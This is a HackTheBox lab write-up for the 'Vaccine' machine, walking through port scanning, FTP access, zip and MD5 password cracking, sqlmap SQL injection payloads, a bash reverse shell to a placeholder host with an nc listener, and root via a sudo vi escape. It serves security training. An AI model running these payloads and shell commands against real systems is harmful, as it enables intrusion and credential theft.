---
title: 'HackTheBox write-up: Vaccine'
author: ib4rz
date: 2021-09-11 17:00
categories: [Starting Point, Linux]
image:
  path: /assets/img/Vaccine/Vaccine.png
tags: [Very Easy, Web, PHP, SUID, RCE]
---

This is a write-up for the Vaccine machine on HackTheBox. It was the third machine in their "Starting Point" series.

## Basic Information
---

Machine IP: __10.10.10.46__ \
Type: __Linux__ \
Difficulty: __Very Easy__

## Scanning
---

First, to find interesting open ports, let's do some reconnaissance and scanning using [nmap](https://nmap.org/).

```console
$ nmap -p- --open -T5 -v -n 10.10.10.46
```

Parameters explanation:

- _p-_: Scan all 65,535 possible port numbers.
- _open_: Only show open (or possibly open) ports.
- _T5_: Faster scan _(T<0-5>)_.
- _v_: Increase verbosity level.
- _n_: Never do DNS resolution.

```console
$ nmap -p- --open -T5 -v -n 10.10.10.46
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 16:03 CEST
Initiating Ping Scan at 16:03
Scanning 10.10.10.46 [4 ports]
Completed Ping Scan at 16:03, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:03
Scanning 10.10.10.46 [65535 ports]
Discovered open port 80/tcp on 10.10.10.46
Discovered open port 21/tcp on 10.10.10.46
Discovered open port 22/tcp on 10.10.10.46
Completed SYN Stealth Scan at 16:03, 12.08s elapsed (65535 total ports)
Nmap scan report for 10.10.10.46
Host is up (0.13s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.17 seconds
           Raw packets sent: 66472 (2.925MB) | Rcvd: 66472 (2.659MB)
```

We see that the machine has a File Transfer Protocol _(port 21)_, Secure Shell _(port 22)_, and a web page _(port 80)_.

## Enumeration
---

We can run `Nmap Scripting Engine` for service/version detection running through each port for the best results.

```console
$ nmap -sV -sC -p21,22,80 10.10.10.46
```
Parameters explanation:

- _sV_: Service fingerprinting.
- _sC_: Launch default NSE nmap scripts.
- _p_: Only scan specified ports.

```console
$ nmap -sV -sC -p21,22,80 10.10.10.46
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 16:06 CEST
Nmap scan report for 10.10.10.46
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux: protocol 2.0)
| ssh-hostkey:
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.45 seconds
```

Relevant information:

| Port  | Service  | Version                      |
| ----- | ---------| -----------------------------|
| 21    | FTP      | Vsftpd 3.0.3                 |
| 22    | SSH      | OpenSSH 8.0p1 Ubuntu 6build1 |
| 80    | HTTP     | Apache 2.4.41                |

Let's identify the website with [WhatWeb](https://tools.kali.org/web-applications/whatweb).

```console
$ whatweb http://10.10.10.46
http://10.10.10.46 [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.46], PasswordField[password], Title[MegaCorp Login]
```
We don't see anything relevant that we don't know.

When browsing `http://10.10.10.46`{: .filepath} with a web browser, we get a login page of MegaCorp with nothing else. Finding hidden files or directories with [Wfuzz](https://tools.kali.org/web-applications/wfuzz) won't be successful.

Since FTP is running, we will start from here.

> Let's remember that the previous machine ([Oopsie](https://ib4rz.github.io/posts/HTB-Oopsie/)), during the post-exploitation phase, we gained user credentials for an FTP service.
{: .prompt-info}

The credentials were:

```yml
user: ftpuser
pass: mc@F1l3ZilL4
```

```console
$ ftp 10.10.10.46
Connected to 10.10.10.46.
220 (vsFTPd 3.0.3)
Name (10.10.10.46:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

It has worked! We are within the service.

## Vulnerability Analysis & Explotation
---

Let's list the contents and run the `passive` command to solve issues with connectivity due to client-side firewalls.

In the current working directory, there is a file called `backup.zip`{: .filepath}, so let's download it using `get`.

```console
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2533 Feb 03  2020 backup.zip
226 Directory send OK.
ftp> passive
Passive mode on.
ftp> get backup.zip
local: backup.zip remote: backup.zip
227 Entering Passive Mode (10,10,10,46,40,107).
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
226 Transfer complete.
2533 bytes received in 0.03 secs (75.5931 kB/s)
ftp> exit
221 Goodbye.
```

Time to investigate the zip archive. The file is encrypted, so we can use [fcrackzip](https://www.kali.org/tools/fcrackzip/) to crack it and unzip the archive.

```console
$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip

PASSWORD FOUND!!!!: pw == 741852963

$ unzip backup.zip
Archive:  backup.zip
[backup.zip] index.php password:
  inflating: index.php
  inflating: style.css
```

Examing the `index.php`{: .filepath} file, there's an if statement containing a credential check containing the valid credentials needed to access the website's login page. 

![Desktop View](/assets/img/Vaccine/index.png){: }

The password is hashed with [MD5](https://en.wikipedia.org/wiki/MD5), a week algorithm for passwords. Let's try to decode it using the [CrackStation](https://crackstation.net/) site.

![Desktop View](/assets/img/Vaccine/crack.png){: }

So now the credentials are:

```yml
user: admin
pass: qwerty789
```

Now let's try to log in to the web page.

The credentials are correct, and we log into the website.

![Desktop View](/assets/img/Vaccine/catalogue.png){: }

### Foothold
---

We have an input field to provide a search query that might be vulnerable to [LFI](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion), [RCE](https://owasp.org/www-community/attacks/Code_Injection) or [SQLi](https://owasp.org/www-community/attacks/Code_Injection).

> We can use [`sqlmap`](https://sqlmap.org/) to automate the process to determine if this webpage is vulnerable to SQL injections or not.
{: .prompt-tip }

```console
$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie='PHPSESSID=klapkg6efqba83l147pp7619ga'
```

Payload:

```console
Parameter: search (GET)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=a';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=a' UNION ALL SELECT NULL,(CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(CHR(89)||CHR(87)||CHR(113)||CHR(86)||CHR(121)||CHR(65)||CHR(75)||CHR(109)||CHR(65)||CHR(104)||CHR(77)||CHR(114)||CHR(83)||CHR(73)||CHR(112)||CHR(75)||CHR(88)||CHR(84)||CHR(109)||CHR(78)||CHR(110)||CHR(106)||CHR(84)||CHR(74)||CHR(102)||CHR(88)||CHR(73)||CHR(77)||CHR(115)||CHR(121)||CHR(70)||CHR(122)||CHR(75)||CHR(78)||CHR(114)||CHR(71)||CHR(65)||CHR(80)||CHR(98)||CHR(112))||(CHR(113)||CHR(98)||CHR(98)||CHR(112)||CHR(113)),NULL,NULL,NULL-- UnCJ
```

The input field seems vulnerable to a `UNION` SQL injection.

Using `--os-shell` as a parameter, we can spawn a shell using sqlmap. 

Let's now spawn a reverse shell in another window, starting a listener on __port 443__ with:

```console
$ nc -lvnp 443
```
Parameters explanation:

- _l_: Listen for connections.
- _v_: Set verbosity level (can be used several times).
- _n_: Do not resolve hostnames via DNS.
- _p_: Specify source port to use.

and then executing the following command on the shell, we got via sqlmap:

```console
$ bash -c 'bash -i >& /dev/tcp/YOUR_IP/443 0>&1'
```
We initiate a reverse shell, and we are in.

![Desktop View](/assets/img/Vaccine/shell.png){: }

> The first step is always stabilizing the shell so we can't accidentally close the connection if we press something like CTRL+C.
{: .prompt-tip }

```console
$ script /dev/null -c bash
CTRL + Z (nc process into the background)
$ stty raw -echo; fg
$ reset
$ xterm
$ export TERM=xterm
$ export SHELL=bash
```
Now we should have a fully stabilized shell.

### On-Machine Enumeration
---

Seeing how we are on a web server's database, let's dig around `/var/www/html`{: .filepath}.

Looking at the `dashboard.php`{: .filepath} file, we can see some credentials.

![Desktop View](/assets/img/Vaccine/credentials.png){: }

```yml
dbname: carsdb
user: pstgres
password: P@s5w0rd!
```

This machine only has a root flag, so let's see if we can become a root!

## Privilege Escalation
---

Running `sudo -l`, we can see the privileges the user _postgres_ can run.

> Unless you upgrade your shell (_explained how to stabilize it just above_), you will get the `error` "_no tty present and no askpass program specified_".
{: .prompt-warning}

```console
postgres@vaccine:/var/lib/postgresql/11/main$ sudo -l
[sudo] password for postgres:
Matching Defaults entries for postgres on vaccine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
postgres@vaccine:/var/lib/postgresql/11/main$
```

We can see _postgres_ can run the following:

```console
$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

So by running it and adding `:!/bin/sh` inside the vi editor, we got ourselves a root shell.

![Desktop View](/assets/img/Vaccine/root.png){: }

Now we can read the root flag!

```console
postgres@vaccine:/var/lib/postgresql/11/main$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

# whoami
root
# cd /root
# ls
pg_hba.conf  root.txt  snap
```

That's it, Vaccine has been Pwned!